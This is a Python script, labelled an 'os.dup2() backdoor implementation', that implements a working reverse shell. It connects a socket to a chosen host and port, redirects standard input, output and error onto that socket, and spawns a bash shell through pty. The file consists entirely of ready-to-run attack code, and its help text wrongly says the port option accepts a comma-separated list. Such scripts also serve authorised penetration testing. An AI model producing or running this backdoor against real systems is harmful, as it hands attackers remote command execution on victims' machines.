"""os.dup2() backdoor implementation

usage: os-dup2-backdoor.py [-h] [-s SHELL] [-l HOST] [-p PORT] [-f FAMILY]
                           [-t TYPE] [--protocol PROTOCOL] [--fileno FILENO]

options:
  -h, --help            show this help message and exit
  -s SHELL, --shell SHELL
                        The shell to spawn
  -l HOST, --host HOST  The IP address to connect to
  -p PORT, --port PORT  A comma separated list of ports to try to connect to
  -f FAMILY, --family FAMILY
                        The socket family to use
  -t TYPE, --type TYPE  The socket type to use
  --protocol PROTOCOL   The socket protocol to use
  --fileno FILENO       The file descriptor to use
"""
import socket
import os
import argparse
import pty


if __name__ == "__main__":
    parser=argparse.ArgumentParser()
    parser.add_argument('-s', '--shell',
                        required=False,
                        action='store',
                        default="/bin/bash",
                        help="The shell to spawn")
    parser.add_argument('-l', '--host', 
                        required=False, 
                        action='store', 
                        default="127.0.0.1", 
                        help='The IP address to connect to')
    parser.add_argument('-p', '--port',
                        required=False,
                        type=int, 
                        default=6969, 
                        help="A comma separated list of ports to try to connect to")
    
    parser.add_argument('-f', '--family',
                        required=False,
                        default=socket.AF_INET,
                        type=lambda s: getattr(socket, s),
                        help="The socket family to use")
    parser.add_argument('-t', '--type',
                        required=False,
                        default=socket.SOCK_STREAM,
                        type=lambda s: getattr(socket, s),
                        help="The socket type to use")
    parser.add_argument('--protocol',
                        required=False,
                        default=-1,
                        type=int,
                        help="The socket protocol to use")
    parser.add_argument('--fileno',
                        required=False,
                        default=None,
                        type=int,
                        help="The file descriptor to use")
    
    args=parser.parse_args()

    # Initialize the socket and connect to the host and port
    s = socket.socket(family=args.family, type=args.type, proto=args.protocol, fileno=args.fileno)
    s.connect((args.host, args.port))

    # Replace the standard input, output, and error streams with the socket
    os.dup2(s.fileno(),0)
    os.dup2(s.fileno(),1)
    os.dup2(s.fileno(),2)
    
    # Spawn the shell
    pty.spawn(args.shell)

    